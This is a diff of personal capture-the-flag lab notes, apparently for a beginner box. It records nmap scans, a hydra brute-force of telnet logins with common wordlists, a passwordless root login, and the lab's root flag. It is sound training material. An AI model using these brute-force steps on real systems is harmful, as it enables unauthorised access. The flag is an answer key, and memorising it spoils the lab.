@@ -5,7 +5,10 @@
 - Constraints: lab
 
 # Recon
-- Quick TCP: nmap target.htb
+- Quick TCP:
+
+```bash
+nmap target.htb
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-08 13:21 -0400
 Nmap scan report for target.htb (10.129.97.216)
 Host is up (0.061s latency).
@@ -14,8 +17,12 @@ PORT   STATE SERVICE
 23/tcp open  telnet
 
 Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
+```
 
-- Targeted Scan: nmap target.htb -sV -sC -A -p23 -vv
+- Targeted Scan:
+
+```bash
+nmap target.htb -sV -sC -A -p23 -vv
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-08 13:23 -0400
 NSE: Loaded 158 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -101,7 +108,7 @@ Read data files from: /usr/share/nmap
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 24.47 seconds
            Raw packets sent: 40 (2.594KB) | Rcvd: 204 (8.898KB)
-
+```
 
 - Full TCP: Same as Targeted Scan
 
@@ -110,7 +117,10 @@ Nmap done: 1 IP address (1 host up) scanned in 24.47 seconds
 
 ## Telnet Enum
 - Tech: Linux telnetd
-- Banner: Trying 10.129.97.216...
+- Banner:
+
+```bash
+Trying 10.129.97.216...
 Connected to target.htb.
 Escape character is '^]'.
   █  █         ▐▌     ▄█▄ █          ▄▄▄▄
@@ -119,9 +129,11 @@ Escape character is '^]'.
 
 
 Meow login: 
+```
 
 - Enumeration: I don't have a username or password. I will have hydra guess for me.
 
+```bash
 hydra -L Usernames/top-usernames-shortlist.txt -P Passwords/Common-Credentials/top-passwords-shortlist.txt target.htb telnet
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -151,6 +163,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-08 13:43:
 [ERROR] 1 target did not resolve or could not be connected
 [ERROR] 0 target did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-08 13:44:50
+```
 
 It appears that the username root will work with any password. So I try that.
 
@@ -158,6 +171,7 @@ It appears that the username root will work with any password. So I try that.
 - Vector: telnet
 - Steps/Commands:
 
+```bash
 telnet target.htb
 Trying 10.129.97.216...
 Connected to target.htb.
@@ -203,16 +217,22 @@ applicable law.
 
 
 Last login: Wed Apr  8 17:43:18 UTC 2026 on pts/9
+```
 
 - Evidence:
+
+```bash
+whoami
+root
+```
 
 ## Flags
 - root.txt b40abdfe23665f766f9c61ecba8a4c19 (Wed 08 Apr 2026 05:48:43 PM UTC)
 
 ## Lessons
-- What Worked: Nmap scan, hydra
+- What Worked: Nmap scan, hydra, and I needed to install seclists on my attack machine
 - Dead Ends: Full Nmap scan found nothing that the Target Scan hadn't already found
 - Reusable Commands:
 
-hydra -L Usernames/top-usernames-shortlist.txt -P Passwords/Common-Credentials/top-passwords-shortlist.txt target.htb telnet
-sudo apt install seclists
+- `hydra -L Usernames/top-usernames-shortlist.txt -P Passwords/Common-Credentials/top-passwords-shortlist.txt target.htb telnet`
+- `sudo apt install seclists`
